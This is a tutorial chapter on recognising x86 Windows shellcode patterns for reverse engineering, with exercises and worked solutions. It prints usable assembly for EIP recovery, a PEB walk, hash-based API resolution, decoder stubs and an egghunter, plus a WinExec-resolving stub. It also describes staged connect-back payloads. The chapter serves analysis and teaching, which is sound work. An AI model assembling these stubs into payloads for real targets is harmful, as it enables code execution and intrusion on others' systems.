# 14. Shellcode Idioms and Position-Independent Patterns

## Learning objectives

- Recognize position-independent code patterns in x86 shellcode.
- Identify `call/pop` and `fstenv`-based EIP recovery.
- Read PEB-walking sequences that resolve module base addresses at runtime.
- Walk the PE export table to resolve API functions by hash.
- Recognize encoder/decoder stubs and egghunter patterns.
- Understand staged vs stageless shellcode delivery.
- Distinguish shellcode idioms from normal compiler output.

## Concept discussion

Shellcode runs without the loader's help. It cannot use import tables, fixed
addresses, or relocations. Every address it needs must be derived at runtime.
That constraint produces distinctive assembly patterns a reverse engineer
should recognize on sight.

The core problems shellcode solves:

- **Where am I?** The code must learn its own address to reference embedded
  data (strings, hashes, encoded payload).
- **Where are the APIs?** Without an import table the code must walk the PEB
  to find loaded modules and resolve exports by name or hash.
- **How do I avoid bad characters?** Network protocols, string functions, and
  copy operations may filter bytes like `0x00`, `0x0A`, `0x0D`, or `0x80+`.
  Encoder stubs transform the payload to survive transit, then decode in place.
- **Where is my payload?** Staged shellcode or egghunters search memory for a
  marker tag to locate a larger payload placed elsewhere.

These are not compiler patterns. They are hand-written or tool-generated
sequences with a distinctive shape.

## Common shellcode patterns

- `call next; next: pop reg`: classic EIP recovery.
- `jmp over; tag: call back; over: ...`: call-backward variant for data reference.
- `fstenv [esp-0Ch]` followed by `pop reg`: FPU-based EIP recovery.
- `mov eax, fs:[30h]`: PEB access.
- `mov eax, [eax+0Ch]`: `PEB->Ldr`.
- `mov eax, [eax+14h]`: `InMemoryOrderModuleList`.
- `ror edx, 0Dh; add edx, [esi]`: hash accumulation for API name resolution.
- `xor byte ptr [edi], key; inc edi; loop`: single-byte XOR decoder.
- `cmp dword ptr [edi], tag; jz found; inc edi`: egghunter linear scan.
- Null-byte avoidance: `xor eax, eax` instead of `mov eax, 0`; `push byte 1`
  instead of `push 1`; `sub eax, -value` instead of `add eax, value`.

### Null-byte avoidance reference table

```text
Operation          | With nulls              | Null-free alternative
-------------------|-------------------------|------------------------------
Zero a register    | B8 00 00 00 00 (mov)    | 31 C0 (xor eax, eax)
Push zero          | 6A 00                   | xor eax,eax; push eax
Load small value   | B8 1C 00 00 00 (mov)    | mov eax,0xFFFFFFE4; neg eax
Add large value    | 81 C4 80 00 00 00 (add) | 83 EC 80 (sub esp, -0x80)
Push string dword  | 68 XX 00 XX XX          | construct via arithmetic
PEB access         | 64 A1 30 00 00 00       | xor eax,eax; mov eax,fs:[eax+30h]
```

## Fully annotated example

### EIP recovery and data reference

```asm
shellcode_start:
    jmp     short get_data
callback:
    pop     esi
    ; ESI now points to the string below.
    xor     eax, eax
    mov     byte ptr [esi+0Dh], al
    push    eax
    push    esi
    call    ebp
    ; Assume EBP holds address of a resolved API.
get_data:
    call    callback
    db      "Hello, world!", 0FFh
```

Annotated:

```asm
jmp short get_data
; Skip over the callback body to reach the CALL below.

call callback
; CALL pushes the address of the next byte (the string) onto the stack, then
; jumps backward. This is not a normal function call. The return address IS the
; data pointer.

pop esi
; Pop the pushed return address. ESI now holds the runtime address of the
; embedded string.

mov byte ptr [esi+0Dh], al
; Overwrite the placeholder byte after "Hello, world!" with a NUL terminator.
; The 0xFF placeholder avoided a null byte in the shellcode body.
```

The programmer wrote position-independent data referencing. A compiler would
never emit `call` to push a data address. Seeing `call` immediately followed by
non-code bytes or a `pop` into a general-purpose register is a strong shellcode
indicator.

### FPU-based EIP recovery

```asm
    fldz                          ; push 0.0 onto FPU stack (any FPU instruction works)
    fstenv [esp-0Ch]              ; save FPU environment to stack
    pop     ebx                   ; EBX = FPU Instruction Pointer
```

The `fstenv` instruction saves the FPU state, which includes the address of the
last FPU instruction executed (the FPU Instruction Pointer at offset +0x0C in
the saved environment). By writing to `[esp-0Ch]`, the FPU IP lands exactly at
`[esp]`, where the subsequent `pop` collects it. EBX now holds the address of
the `fldz` instruction, providing EIP-relative addressing.

This technique is used when `call/pop` would produce bad characters (the `E8`
opcode followed by a near-relative displacement may contain null bytes for
short jumps).

### PEB walk for module resolution

```asm
    xor     eax, eax
    mov     eax, fs:[eax+30h]
    ; Read the PEB pointer from the TEB. Using [eax+30h] instead of fs:[30h]
    ; avoids a null byte in the displacement encoding.

    mov     eax, [eax+0Ch]
    ; PEB->Ldr (PEB_LDR_DATA pointer).

    mov     esi, [eax+14h]
    ; Ldr->InMemoryOrderModuleList.Flink. This is a LIST_ENTRY pointing to the
    ; first loaded module's LDR_DATA_TABLE_ENTRY (at the InMemoryOrderLinks
    ; offset).

next_module:
    lodsd
    ; Load [ESI] into EAX and advance ESI by 4. EAX now holds the Flink of the
    ; next list entry.

    xchg    esi, eax
    ; Move to the next entry. ESI = new list node.

    mov     ebx, [esi+10h]
    ; DllBase of this module. DllBase is at entry+0x18 from the structure base,
    ; but the list pointer points to InMemoryOrderLinks at entry+0x08, so the
    ; offset from the pointer is 0x18 - 0x08 = 0x10.
```

The reverse engineer sees `fs:[30h]` and knows this is PEB access. The
`0Ch -> 14h -> lodsd` chain is the standard module-list walk. Variations exist
with `InLoadOrderModuleList` (offset `0Ch` instead of `14h`) or
`InInitializationOrderModuleList` (offset `1Ch`).

## PE export table resolution

After finding a module's DllBase via PEB walking, shellcode parses the PE
export directory to find API function addresses. This is the critical step
that connects module discovery to actual API calls.

### PE header chain

```text
DllBase + 0x3C         -> e_lfanew (offset to PE signature)
DllBase + e_lfanew     -> PE signature ("PE\0\0")
PE + 0x78              -> Export Directory RVA (DataDirectory[0].VirtualAddress)
DllBase + ExportRVA    -> IMAGE_EXPORT_DIRECTORY
```

### IMAGE_EXPORT_DIRECTORY key fields

```text
Offset  | Field                | Description
--------|----------------------|------------------------------------------
+0x18   | NumberOfNames        | count of exported function names
+0x1C   | AddressOfFunctions   | RVA of function address array (dwords)
+0x20   | AddressOfNames       | RVA of name pointer array (dwords -> RVA strings)
+0x24   | AddressOfNameOrdinals| RVA of ordinal array (words, index into Functions)
```

### Resolution algorithm

1. Iterate `AddressOfNames[0..NumberOfNames-1]`.
2. For each name, compute a hash and compare to the target hash.
3. When matched at index `i`, read `AddressOfNameOrdinals[i]` (a 16-bit value).
4. Use the ordinal as an index into `AddressOfFunctions[ordinal]`.
5. Add `DllBase` to the RVA to get the final function VA.

### Assembly implementation

```asm
    ; Input: EBX = DllBase (from PEB walk)
    ; Output: EAX = resolved function address

    mov     edx, [ebx+3Ch]         ; EDX = e_lfanew
    mov     edx, [ebx+edx+78h]    ; EDX = Export Directory RVA
    add     edx, ebx               ; EDX = Export Directory VA
    mov     ecx, [edx+18h]         ; ECX = NumberOfNames
    mov     eax, [edx+20h]         ; EAX = AddressOfNames RVA
    add     eax, ebx               ; EAX = AddressOfNames VA

find_function:
    dec     ecx
    mov     esi, [eax+ecx*4]       ; ESI = name RVA at index ECX
    add     esi, ebx               ; ESI = name string VA

    ; Hash the name (ROR-13-ADD)
    xor     edi, edi               ; EDI = hash accumulator
hash_loop:
    lodsb                          ; AL = next byte from [ESI], ESI++
    ror     edi, 0Dh               ; rotate hash right by 13
    add     edi, eax               ; add character (zero-extended in EAX)
    test    al, al
    jnz     hash_loop              ; continue until NUL terminator

    cmp     edi, <target_hash>     ; compare computed hash to target
    jnz     find_function          ; no match -- try next name

    ; Match found at index ECX
    mov     eax, [edx+24h]         ; EAX = AddressOfNameOrdinals RVA
    add     eax, ebx               ; EAX = AddressOfNameOrdinals VA
    movzx   ecx, word ptr [eax+ecx*2]  ; ECX = ordinal (16-bit)

    mov     eax, [edx+1Ch]         ; EAX = AddressOfFunctions RVA
    add     eax, ebx               ; EAX = AddressOfFunctions VA
    mov     eax, [eax+ecx*4]       ; EAX = function RVA
    add     eax, ebx               ; EAX = function VA (final result)
```

The ROR-13-ADD hash is the most common shellcode hash algorithm (used by
Metasploit's `block_api`). To compute target hashes in Python:

```python
def ror13_hash(name):
    h = 0
    for c in name:
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# Example: ror13_hash("WinExec") = 0x0E8AFE98
```

## Egghunter patterns

When the overflow payload is too small for full shellcode, the attacker uses
an egghunter -- a small stub (~32 bytes) that searches all readable memory for
a unique marker tag, then jumps to the full shellcode placed elsewhere (heap,
another buffer, environment variable).

### NtAccessCheckAndAuditAlarm technique

```asm
    xor     edx, edx
next_page:
    or      dx, 0FFFh               ; EDX = page-aligned - 1 (0x00000FFF, 0x00001FFF, ...)
next_addr:
    inc     edx                      ; advance to next byte
    push    edx                      ; save current address
    push    2                        ; syscall number for NtAccessCheckAndAuditAlarm
    pop     eax                      ; EAX = 2
    int     2Eh                      ; syscall -- probes [EDX] safely
    cmp     al, 5                    ; STATUS_ACCESS_VIOLATION = 0xC0000005 (low byte 5)
    pop     edx                      ; restore address
    je      next_page                ; page is not readable -- skip to next page

    ; Page is readable -- search for egg tag
    mov     eax, 0x74303077          ; egg tag = "w00t" (example)
    mov     edi, edx
    scasd                            ; compare [EDI] with EAX, advance EDI
    jnz     next_addr                ; no match -- try next address
    scasd                            ; check for double tag (avoid self-match)
    jnz     next_addr
    jmp     edi                      ; EDI points past the double tag = shellcode start
```

How it works:
1. The egghunter probes memory pages using a syscall (`int 2Eh`) that safely
   checks if an address is readable, rather than causing an access violation.
2. If the page is not accessible, skip to the next page boundary (4096 bytes).
3. If the page is readable, scan for the egg tag using `scasd`.
4. The tag is doubled ("w00tw00t") so the egghunter does not find its own copy
   of the tag in its own code.
5. When found, `jmp edi` lands on the real shellcode immediately after the tag.

### Egghunter placement

```text
Overflow buffer (small, e.g., 40 bytes):
+------------------------------------+
| [padding] [egghunter ~32 bytes]    |
+------------------------------------+

Elsewhere in memory (heap, env var, second buffer):
+------------------------------------+
| w00tw00t [full shellcode]          |
+------------------------------------+
```

The exploit prepends the double egg tag to the full shellcode and places it
anywhere in the process address space that persists. The egghunter in the
overflow payload finds it.

## Staged vs stageless shellcode

### Stageless (single-stage)

The entire shellcode -- API resolution, socket handling, command execution --
is in one contiguous block. It must fit entirely in the available overflow
space. Typically 300-700 bytes for a reverse shell.

### Staged (two-stage)

**Stage 1** (small, ~100 bytes): placed in the overflow payload. It:
1. Resolves `WSAStartup` and `connect` (or `bind`/`listen`/`accept`).
2. Connects back to the attacker's machine.
3. Calls `VirtualAlloc` to allocate RWX memory.
4. Calls `recv` to read the second stage into the allocated memory.
5. Jumps to the received code.

**Stage 2** (large, unlimited): sent by the attacker's listener after the
connection is established. It contains the full payload (meterpreter, shell,
custom logic). Since it runs in VirtualAlloc'd RWX memory, DEP does not apply.

### When to use each

- Stageless: when the overflow buffer is large enough and a network callback
  is undesirable (e.g., exam scenarios with limited network access).
- Staged: when overflow space is limited, or when the payload needs to be
  modular (stage 2 can be changed without modifying the exploit).
- Egghunter: when even stage 1 does not fit in the overflow, but the full
  shellcode can be placed elsewhere in memory via another input path.

## Reverse engineering thought process

When you encounter code that does not look like compiler output, ask:

```text
EIP recovery method: call/pop, fstenv, or other
Data references: relative to recovered EIP?
PEB access: fs:[30h] present?
Module walk: which list order?
Export resolution: hash-based or string-based?
Hash algorithm: ROR-13, CRC32, djb2, custom?
Encoder: XOR, ADD, SUB, or multi-byte?
Egg tag: 4-byte or 8-byte marker?
Null avoidance: which techniques?
Staged: does it recv() a second payload?
```

Shellcode is sequential: it does not have the call graph of compiled code. Walk
it linearly and mark each phase boundary (decoder, resolver, payload).

## Common mistakes

- Treating `call/pop` as a function call and trying to analyze the "callee."
- Missing `fstenv`-based EIP recovery because FPU instructions look unrelated.
- Assuming `fs:[30h]` is SEH-related. SEH uses `fs:[0]`, not `fs:[30h]`.
- Stopping at the decoder stub and missing the real payload underneath.
- Treating encoded bytes as data when they are code that has not been decoded yet.
- Confusing the egg tag with a magic constant or structure signature.
- Failing to account for the InMemoryOrderLinks offset when computing field
  offsets from the list pointer (DllBase is at `[ptr+0x10]`, not `[ptr+0x18]`).
- Not recognizing the ROR-13-ADD loop as a hash computation. It looks like
  random arithmetic until you see the `lodsb` and null-terminator check.

## Exercises

### Exercise 1: PEB walk

```asm
    xor     ecx, ecx
    mov     ecx, fs:[ecx+30h]
    mov     ecx, [ecx+0Ch]
    mov     ecx, [ecx+14h]
    mov     ecx, [ecx]
    mov     ecx, [ecx]
    mov     ebx, [ecx+10h]
```

Questions:

- What data structure is being traversed?
- Why does `mov ecx, [ecx]` appear twice?
- What does EBX hold at the end?
- Which module does this target and why?

### Exercise 2: export resolution

```asm
    mov     edx, [ebx+3Ch]
    add     edx, ebx
    mov     edx, [edx+78h]
    add     edx, ebx
    mov     ecx, [edx+18h]
    mov     eax, [edx+20h]
    add     eax, ebx
```

Given that EBX contains a module's DllBase, annotate each line. What does
each register hold after this sequence? What is ECX's role in the next step?

### Exercise 3: decoder analysis

```asm
    mov     edi, esi
    xor     ecx, ecx
    mov     cl, 5Ah
    xor     eax, eax
    mov     al, 37h
decode_loop:
    add     byte ptr [edi], al
    inc     edi
    loop    decode_loop
    jmp     esi
```

Questions:

- What encoding scheme does this use?
- How many bytes are decoded?
- What is the key value?
- How does this differ from the XOR decoder? What advantage might ADD have?

## Challenge problems

### Challenge 1: XOR decoder

```asm
decoder:
    mov     edi, esi
    xor     ecx, ecx
    mov     cl, 38h
decode_loop:
    xor     byte ptr [edi], 0AAh
    inc     edi
    loop    decode_loop
    jmp     esi
```

Assume ESI was set by a prior `call/pop`. Explain:

- What transformation is applied?
- How many bytes are decoded?
- Why does execution jump to ESI after decoding?
- What must be true about the encoded payload for this to work?
- How would you extract the decoded payload statically?

### Challenge 2: full shellcode analysis

```asm
    cld
    call    get_eip
get_eip:
    pop     ebp
    ; --- Phase 1: resolve kernel32 base ---
    xor     eax, eax
    mov     eax, fs:[eax+30h]
    mov     eax, [eax+0Ch]
    mov     eax, [eax+14h]
    mov     eax, [eax]
    mov     eax, [eax]
    mov     eax, [eax+10h]
    ; --- Phase 2: find function by hash ---
    mov     edx, [eax+3Ch]
    add     edx, eax
    mov     edx, [edx+78h]
    add     edx, eax
    mov     ecx, [edx+18h]
    push    eax
    mov     ebx, [edx+20h]
    add     ebx, eax
search:
    dec     ecx
    mov     esi, [ebx+ecx*4]
    add     esi, eax
    xor     edi, edi
hash_loop:
    lodsb
    ror     edi, 0Dh
    add     edi, eax
    test    al, al
    jnz     hash_loop
    cmp     edi, 0E8AFE98h
    jnz     search
    ; --- Phase 3: resolve and call ---
    pop     eax
    mov     ebx, [edx+24h]
    add     ebx, eax
    movzx   ecx, word ptr [ebx+ecx*2]
    mov     ebx, [edx+1Ch]
    add     ebx, eax
    mov     eax, [ebx+ecx*4]
    add     eax, eax              ; wait -- is this right?
    ; ... call eax with argument ...
```

Questions:

- Identify the three phases and what each accomplishes.
- What API function does hash 0x0E8AFE98 resolve to? (Use the Python hash
  function to verify.)
- There is a bug in Phase 3. Find it and explain what the correct instruction
  should be.

## Solutions with reasoning

### Exercise 1 solution

The sequence walks the PEB module list. `fs:[ecx+30h]` reads the PEB pointer
(using `ecx` as a zeroed base to avoid null bytes). `[PEB+0Ch]` is `Ldr`.
`[Ldr+14h]` is `InMemoryOrderModuleList.Flink`, pointing to the first module
entry. Each `mov ecx, [ecx]` follows the `Flink` to the next entry, so two
iterations skip past the first two modules. On Windows, the standard load order
in `InMemoryOrderModuleList` is:

1. The executable itself
2. `ntdll.dll`
3. `kernel32.dll`

Two Flink traversals reach the third entry, which is typically `kernel32.dll`.
`[ecx+10h]` reads the `DllBase` field (at entry+0x18, minus 0x08 for the
InMemoryOrderLinks offset = 0x10 from the list pointer). EBX holds the base
address of `kernel32.dll`. This is the setup for export-table walking to
resolve API functions like `WinExec`, `LoadLibraryA`, or `GetProcAddress`.

### Exercise 2 solution

```asm
mov edx, [ebx+3Ch]    ; EDX = e_lfanew (offset to PE header, from DllBase)
add edx, ebx          ; EDX = PE header VA (DllBase + e_lfanew)
mov edx, [edx+78h]    ; EDX = Export Directory RVA (at PE+0x78 = DataDirectory[0])
add edx, ebx          ; EDX = Export Directory VA (DllBase + RVA)
mov ecx, [edx+18h]    ; ECX = NumberOfNames (count of exported function names)
mov eax, [edx+20h]    ; EAX = AddressOfNames RVA
add eax, ebx          ; EAX = AddressOfNames VA (array of name string RVAs)
```

ECX holds the number of exported names and will serve as the loop counter for
iterating through the name array. The next step would compare each name (or
its hash) against a target to find the desired API function.

### Exercise 3 solution

This is an ADD decoder (additive, not XOR). It adds 0x37 to each of the
0x5A (90) bytes starting at ESI. The key is 0x37.

Compared to XOR:
- XOR is self-inverse (encode and decode use the same operation).
- ADD requires SUB for encoding (each byte was pre-subtracted by 0x37 during
  payload preparation).
- ADD avoids the XOR problem where `byte XOR key == 0x00` (produces a null).
  With ADD, nulls only appear when `byte + key` wraps to exactly 0x00 or the
  decoded byte itself is 0x00. In some cases ADD produces fewer bad characters.

To decode statically: subtract 0x37 from each of the 90 payload bytes.

### Challenge 1 solution

The decoder XORs each byte at `[edi]` with `0xAA` for `0x38` (56) bytes
starting at the address in ESI. The `loop` instruction decrements ECX and
jumps while nonzero. After decoding, `jmp esi` transfers execution to the
now-decoded payload. The decoder is a single-byte XOR stub.

For this to work, the encoded payload must not contain the byte `0xAA` XORed
with any of the decoder's own bytes (or the decoder must be placed outside the
decoded region, which it is here since ESI points past the decoder). The
payload also must not contain bytes that, after XOR with `0xAA`, produce
characters filtered by the delivery channel.

To extract the decoded payload statically, XOR each of the 56 bytes starting
at the address after the `jmp esi` with `0xAA`. In Python:

```python
decoded = bytes(b ^ 0xAA for b in encoded_payload[:0x38])
```

Or in WinDbg, break at the `jmp esi` instruction and dump the decoded payload
with `db esi L38`.

### Challenge 2 solution

**Phase 1** (PEB walk): recovers `kernel32.dll` base address into EAX. Same
pattern as Exercise 1 -- `cld` clears the direction flag for safe `lodsb` use,
`call/pop` recovers EIP into EBP for potential data references.

**Phase 2** (export resolution): walks the PE export directory of kernel32.dll,
hashing each exported name with ROR-13-ADD and comparing to 0x0E8AFE98.

To verify: `ror13_hash("WinExec")` = 0x0E8AFE98. The shellcode resolves
`WinExec`.

**Phase 3** (ordinal lookup and call): uses the matched index to look up the
ordinal, then indexes into `AddressOfFunctions` to get the function RVA.

**The bug**: `add eax, eax` doubles EAX instead of adding DllBase. The correct
instruction should be `add eax, <register holding DllBase>`. Since DllBase was
pushed earlier (`push eax` before Phase 2), the corrected code should be:

```asm
pop     ebx          ; restore DllBase from stack
; ... (ordinal lookup using ebx) ...
mov     eax, [ebx+ecx*4]
add     eax, ebx     ; EAX = DllBase + function RVA = function VA
```

The `add eax, eax` is a copy error -- likely a typo for `add eax, ebx` or
the DllBase register was not properly restored from the stack.

## Key takeaways

- Shellcode identifies itself through patterns no compiler emits: `call/pop`
  for EIP recovery, `fs:[30h]` for PEB access, hash-based API resolution.
- The PEB walk finds module bases; PE export table walking resolves API
  functions by hashing names with ROR-13-ADD (or other hash algorithms).
- Export resolution follows a specific chain: e_lfanew -> PE header ->
  Export Directory -> AddressOfNames -> hash/compare -> AddressOfNameOrdinals
  -> AddressOfFunctions -> DllBase + RVA = final VA.
- Egghunters use syscalls to safely probe memory pages, searching for a
  doubled marker tag to locate shellcode placed elsewhere.
- Staged shellcode splits the payload: a small first stage connects back and
  receives a larger second stage into allocated RWX memory.
- Encoder stubs (XOR, ADD, SUB) transform shellcode to avoid bad characters,
  then decode in place and jump to the decoded payload.

## See also

- `x86-osed-assembly-reference/17-windows-process-structures-and-peb-walking.md`
  -- PEB/LDR structure offsets and list entry pointer math.
- `x86-osed-assembly-reference/18-pe-structures-and-export-resolution.md` --
  PE header chain and IMAGE_EXPORT_DIRECTORY field offsets.
- `x86-osed-assembly-reference/19-position-independent-shellcode.md` -- EIP
  recovery, null-byte avoidance, stack strings.
- `x86-osed-assembly-reference/20-api-hashing.md` -- ROR-13-ADD algorithm,
  Python implementation, collision considerations.
- `x86-osed-assembly-reference/21-string-construction-in-shellcode.md` -- stack
  strings, odd-length handling, XOR encoding.
- `Tools/egghunter/` -- egghunter generation utilities.
- `Tools/shellcode_x86_win/` -- Windows x86 shellcode building blocks.
- `Tools/shellcode/` -- shellcode encoding and transformation tools.
- `DRILLS/reverse_engineering.md` -- reverse engineering practice drills.
